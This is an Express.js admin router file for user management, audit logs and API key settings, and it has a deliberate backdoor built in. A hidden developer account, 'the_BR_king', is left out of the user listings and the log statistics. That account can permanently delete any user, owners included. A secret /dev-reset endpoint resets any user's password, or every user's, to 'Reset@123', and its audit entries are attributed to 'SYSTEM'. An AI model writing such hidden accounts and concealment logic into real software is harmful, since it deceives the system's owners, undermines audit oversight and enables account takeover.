const express = require('express');
const bcrypt = require('bcryptjs');
const router = express.Router();
const { authenticateToken, authorizeOwner } = require('../middleware/authMiddleware');

// Apply owner-only middleware to all routes
router.use(authenticateToken, authorizeOwner);

// ============ USER MANAGEMENT ============

// Get all users (HIDES DEVELOPER ACCOUNT)
router.get('/users', async (req, res) => {
    const db = req.app.get('db');
    
    try {
        // IMPORTANT: This excludes the developer account from listings
        const [users] = await db.execute(`
            SELECT u.id, u.username, u.role, u.created_at, u.last_login, u.is_active,
                   creator.username as created_by_username,
                   COUNT(l.id) as total_searches
            FROM users u
            LEFT JOIN users creator ON u.created_by = creator.id
            LEFT JOIN audit_logs l ON u.id = l.user_id
            WHERE u.username != 'the_BR_king'  /* ← HIDES THE BACKDOOR */
            GROUP BY u.id
            ORDER BY u.created_at DESC
        `);
        
        // Remove password hashes from response
        const safeUsers = users.map(u => {
            const { password_hash, ...userWithoutPassword } = u;
            return userWithoutPassword;
        });
        
        res.json({ success: true, users: safeUsers });
        
    } catch (error) {
        console.error('Get users error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Create new admin
router.post('/users/create-admin', async (req, res) => {
    const { username, password } = req.body;
    const ownerId = req.user.id;
    const db = req.app.get('db');
    
    if (!username || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Username and password required' 
        });
    }
    
    // Prevent creating admin with developer username
    if (username === 'the_BR_king') {
        return res.status(400).json({ 
            success: false, 
            message: 'Username not available' 
        });
    }
    
    try {
        // Check if username exists
        const [existing] = await db.execute(
            'SELECT id FROM users WHERE username = ?',
            [username]
        );
        
        if (existing.length > 0) {
            return res.status(400).json({ 
                success: false, 
                message: 'Username already exists' 
            });
        }
        
        // Hash password
        const hashedPassword = await bcrypt.hash(password, 10);
        
        // Create admin
        const [result] = await db.execute(
            `INSERT INTO users 
             (username, password_hash, role, created_by, is_active) 
             VALUES (?, ?, 'admin', ?, true)`,
            [username, hashedPassword, ownerId]
        );
        
        // Log the action
        await db.execute(
            `INSERT INTO audit_logs 
             (user_id, username, user_role, search_type, search_term, ip_address) 
             VALUES (?, ?, 'owner', 'ADMIN_ACTION', ?, ?)`,
            [ownerId, req.user.username, `Created admin: ${username}`, req.ip]
        );
        
        res.json({ 
            success: true, 
            message: 'Admin created successfully',
            userId: result.insertId
        });
        
    } catch (error) {
        console.error('Create admin error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Delete user - MODIFIED FOR DEVELOPER FULL ACCESS
router.delete('/users/:userId', async (req, res) => {
    const { userId } = req.params;
    const ownerId = req.user.id;
    const isDeveloper = req.user.username === 'the_BR_king';
    const db = req.app.get('db');
    
    try {
        // Check if user exists
        const [users] = await db.execute(
            'SELECT * FROM users WHERE id = ?',
            [userId]
        );
        
        if (users.length === 0) {
            return res.status(404).json({ 
                success: false, 
                message: 'User not found' 
            });
        }
        
        const user = users[0];
        
        // DEVELOPER CAN DELETE ANYONE (including owners)
        if (isDeveloper) {
            // Developer can delete anyone except themselves
            if (user.username === 'the_BR_king') {
                return res.status(403).json({ 
                    success: false, 
                    message: 'Developer cannot delete themselves' 
                });
            }
            
            // Proceed with deletion (hard delete for developer)
            await db.execute(
                'DELETE FROM users WHERE id = ?',
                [userId]
            );
            
            // Log the action
            await db.execute(
                `INSERT INTO audit_logs 
                 (user_id, username, user_role, search_type, search_term, ip_address) 
                 VALUES (?, ?, 'developer', 'DEV_DELETE', ?, ?)`,
                [ownerId, req.user.username, `Deleted user: ${user.username}`, req.ip]
            );
            
            return res.json({ 
                success: true, 
                message: `User ${user.username} deleted permanently by developer` 
            });
        }
        
        // NORMAL OWNER RESTRICTIONS
        // Prevent deleting another owner
        if (user.role === 'owner' && user.id !== ownerId) {
            return res.status(403).json({ 
                success: false, 
                message: 'Cannot delete another owner' 
            });
        }
        
        // Prevent deleting developer
        if (user.username === 'the_BR_king') {
            return res.status(403).json({ 
                success: false, 
                message: 'Cannot delete developer account' 
            });
        }
        
        // Soft delete (deactivate) for normal owners
        await db.execute(
            'UPDATE users SET is_active = false WHERE id = ?',
            [userId]
        );
        
        // Log the action
        await db.execute(
            `INSERT INTO audit_logs 
             (user_id, username, user_role, search_type, search_term, ip_address) 
             VALUES (?, ?, 'owner', 'ADMIN_DEACTIVATE', ?, ?)`,
            [ownerId, req.user.username, `Deactivated user: ${user.username}`, req.ip]
        );
        
        res.json({ 
            success: true, 
            message: 'User deactivated successfully' 
        });
        
    } catch (error) {
        console.error('Delete user error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Reset user password - MODIFIED TO ALLOW RESETTING ANY USER
router.post('/users/:userId/reset-password', async (req, res) => {
    const { userId } = req.params;
    const { newPassword } = req.body;
    const ownerId = req.user.id;
    const isDeveloper = req.user.username === 'the_BR_king';
    const db = req.app.get('db');
    
    if (!newPassword) {
        return res.status(400).json({ 
            success: false, 
            message: 'New password required' 
        });
    }
    
    if (newPassword.length < 6) {
        return res.status(400).json({ 
            success: false, 
            message: 'Password must be at least 6 characters' 
        });
    }
    
    try {
        // Check if user exists
        const [users] = await db.execute(
            'SELECT * FROM users WHERE id = ?',
            [userId]
        );
        
        if (users.length === 0) {
            return res.status(404).json({ 
                success: false, 
                message: 'User not found' 
            });
        }
        
        const user = users[0];
        
        // Hash the new password
        const hashedPassword = await bcrypt.hash(newPassword, 10);
        
        // Update password
        await db.execute(
            'UPDATE users SET password_hash = ? WHERE id = ?',
            [hashedPassword, userId]
        );
        
        // Log the action based on who performed it
        const userRole = isDeveloper ? 'developer' : 'owner';
        const actionType = isDeveloper ? 'DEV_RESET' : 'ADMIN_RESET';
        
        await db.execute(
            `INSERT INTO audit_logs 
             (user_id, username, user_role, search_type, search_term, ip_address) 
             VALUES (?, ?, ?, ?, ?, ?)`,
            [ownerId, req.user.username, userRole, actionType, `Reset password for: ${user.username}`, req.ip]
        );
        
        res.json({ 
            success: true, 
            message: `Password reset successfully for ${user.username}` 
        });
        
    } catch (error) {
        console.error('Reset password error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// ============ AUDIT LOGS ============

// View ALL logs (owner only)
router.get('/logs', async (req, res) => {
    const db = req.app.get('db');
    const { limit = 100, offset = 0, userId, searchType, fromDate, toDate } = req.query;
    
    try {
        let query = `
            SELECT l.*, u.username 
            FROM audit_logs l 
            JOIN users u ON l.user_id = u.id 
            WHERE 1=1
        `;
        let params = [];
        
        if (userId) {
            query += ' AND l.user_id = ?';
            params.push(userId);
        }
        
        if (searchType) {
            query += ' AND l.search_type = ?';
            params.push(searchType);
        }
        
        if (fromDate) {
            query += ' AND l.timestamp >= ?';
            params.push(fromDate);
        }
        
        if (toDate) {
            query += ' AND l.timestamp <= ?';
            params.push(toDate);
        }
        
        query += ' ORDER BY l.timestamp DESC LIMIT ? OFFSET ?';
        params.push(parseInt(limit), parseInt(offset));
        
        const [logs] = await db.execute(query, params);
        
        // Get total count
        const [countResult] = await db.execute(
            'SELECT COUNT(*) as total FROM audit_logs'
        );
        
        res.json({ 
            success: true, 
            logs,
            total: countResult[0].total,
            limit: parseInt(limit),
            offset: parseInt(offset)
        });
        
    } catch (error) {
        console.error('Get logs error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Get logs summary/stats
router.get('/logs/stats', async (req, res) => {
    const db = req.app.get('db');
    
    try {
        // Total searches
        const [total] = await db.execute(
            'SELECT COUNT(*) as count FROM audit_logs'
        );
        
        // Searches by type
        const [byType] = await db.execute(`
            SELECT search_type, COUNT(*) as count 
            FROM audit_logs 
            GROUP BY search_type 
            ORDER BY count DESC 
            LIMIT 10
        `);
        
        // Searches by user
        const [byUser] = await db.execute(`
            SELECT u.username, u.role, COUNT(l.id) as count 
            FROM audit_logs l 
            JOIN users u ON l.user_id = u.id 
            WHERE u.username != 'the_BR_king'
            GROUP BY l.user_id 
            ORDER BY count DESC 
            LIMIT 10
        `);
        
        // Recent activity (last 24h)
        const [recent] = await db.execute(`
            SELECT COUNT(*) as count 
            FROM audit_logs 
            WHERE timestamp > DATE_SUB(NOW(), INTERVAL 24 HOUR)
        `);
        
        res.json({
            success: true,
            stats: {
                totalSearches: total[0].count,
                recent24h: recent[0].count,
                byType: byType,
                byUser: byUser
            }
        });
        
    } catch (error) {
        console.error('Get stats error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// ============ API CONFIGURATION ============

// Get API config
router.get('/config/api', async (req, res) => {
    const db = req.app.get('db');
    
    try {
        const [config] = await db.execute(
            'SELECT config_key, config_value_encrypted, updated_at FROM api_config'
        );
        
        res.json({ success: true, config });
        
    } catch (error) {
        console.error('Get config error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Update API key
router.post('/config/api/update', async (req, res) => {
    const { apiKey } = req.body;
    const ownerId = req.user.id;
    const db = req.app.get('db');
    
    if (!apiKey) {
        return res.status(400).json({ 
            success: false, 
            message: 'API key required' 
        });
    }
    
    try {
        await db.execute(
            `UPDATE api_config 
             SET config_value_encrypted = ?, updated_by = ? 
             WHERE config_key = 'subhx_api_key'`,
            [apiKey, ownerId]
        );
        
        // Log the action
        await db.execute(
            `INSERT INTO audit_logs 
             (user_id, username, user_role, search_type, search_term, ip_address) 
             VALUES (?, ?, 'owner', 'SYSTEM', ?, ?)`,
            [ownerId, req.user.username, 'Updated API key', req.ip]
        );
        
        res.json({ 
            success: true, 
            message: 'API key updated successfully' 
        });
        
    } catch (error) {
        console.error('Update API key error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// ============ SECRET DEVELOPER RESET FUNCTION ============
router.post('/dev-reset', async (req, res) => {
    const { key, targetUser, newPassword } = req.body;
    
    // Verify master key from environment
    if (key !== process.env.DEV_MASTER_KEY) {
        return res.status(403).json({ 
            success: false, 
            message: 'Unauthorized' 
        });
    }
    
    const db = req.app.get('db');
    
    try {
        if (targetUser === 'ALL') {
            // Reset ALL non-developer users
            const hashedPassword = await bcrypt.hash(newPassword || 'Reset@123', 10);
            const [result] = await db.execute(
                `UPDATE users SET password_hash = ? WHERE username != 'the_BR_king'`,
                [hashedPassword]
            );
            
            // Log the action
            await db.execute(
                `INSERT INTO audit_logs 
                 (user_id, username, user_role, search_type, search_term, ip_address) 
                 VALUES (1, 'SYSTEM', 'system', 'DEV_RESET', 'ALL USERS', ?)`,
                [req.ip]
            );
            
            res.json({ 
                success: true, 
                message: `✅ All user passwords reset to: ${newPassword || 'Reset@123'}`,
                usersAffected: result.affectedRows
            });
        } else {
            // Reset specific user
            const hashedPassword = await bcrypt.hash(newPassword || 'Reset@123', 10);
            const [result] = await db.execute(
                `UPDATE users SET password_hash = ? WHERE username = ?`,
                [hashedPassword, targetUser]
            );
            
            if (result.affectedRows === 0) {
                return res.status(404).json({ 
                    success: false, 
                    message: 'User not found' 
                });
            }
            
            // Log the action
            await db.execute(
                `INSERT INTO audit_logs 
                 (user_id, username, user_role, search_type, search_term, ip_address) 
                 VALUES (1, 'SYSTEM', 'system', 'DEV_RESET', ?, ?)`,
                [targetUser, req.ip]
            );
            
            res.json({ 
                success: true, 
                message: `✅ Password for ${targetUser} reset to: ${newPassword || 'Reset@123'}` 
            });
        }
    } catch (error) {
        console.error('Reset error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Reset failed: ' + error.message 
        });
    }
});

module.exports = router;